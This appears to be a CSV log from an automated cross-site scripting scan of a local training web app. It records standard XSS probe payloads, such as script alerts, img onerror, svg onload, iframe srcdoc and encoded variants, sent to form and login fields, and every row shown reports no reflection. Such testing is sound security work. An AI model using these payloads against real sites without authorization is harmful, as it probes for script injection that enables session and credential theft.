page_url,param_tested,method,payload,status,reflected,dom_rendered,stored_candidate_pages,evidence,baseline_len,response_len
http://localhost:8080/vulnerabilities/xss_r/,name,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/xss_r/,name,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,step,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_new,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,password_conf,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/captcha/,Change,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<script>alert('XSS')</script>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"""><script>alert('XSS')</script>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<img src=x onerror=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<svg/onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,<body onload=alert('XSS')>,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"'""><img src=x onerror=alert(1)>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,id,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/vulnerabilities/sqli_blind/,Submit,GET,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1523,1523
http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,200,False,False,,,1573,1573
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/csrf/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,305,305
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<script>alert('XSS')</script>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"""><script>alert('XSS')</script>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<svg/onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,<body onload=alert('XSS')>,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"'""><img src=x onerror=alert(1)>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,"<iframe srcdoc=""<script>alert('XSS')</script>""></iframe>",404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,username,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,password,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,Login,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
http://localhost:8080/vulnerabilities/xss_s/login.php,user_token,POST,%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,404,False,False,,,306,306
http://localhost:8080/login.php,username,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<script>alert('XSS')</script>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,"""><script>alert('XSS')</script>",200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<img src=x onerror=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,user_token,POST,<svg/onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,username,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,password,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
http://localhost:8080/login.php,Login,POST,<body onload=alert('XSS')>,200,False,False,,,1573,1573
